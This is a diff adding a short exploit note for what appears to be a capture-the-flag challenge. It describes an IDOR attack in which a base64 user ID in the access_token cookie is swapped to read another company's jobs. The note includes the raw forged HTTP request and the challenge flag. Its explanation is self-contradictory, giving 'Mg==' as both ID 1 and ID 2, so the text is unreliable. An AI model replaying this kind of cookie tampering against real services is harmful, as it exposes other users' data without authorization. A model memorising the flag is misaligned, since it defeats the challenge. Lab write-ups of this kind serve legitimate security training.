@@ -1,0 +1,5 @@
+# IDOR via base64-encoded user ID in access_token cookie. Login as demo (gets Mg==: ID=1), change to Mg== (ID=2) to access company 2 data and extract flag{0d8ca439-1cc2-4de9-a83f-08182aede041}
+
+GET /company/2/jobs HTTP/1.1
+Host: 172.17.0.1:49433
+Cookie: access_token="Bearer Mg=="
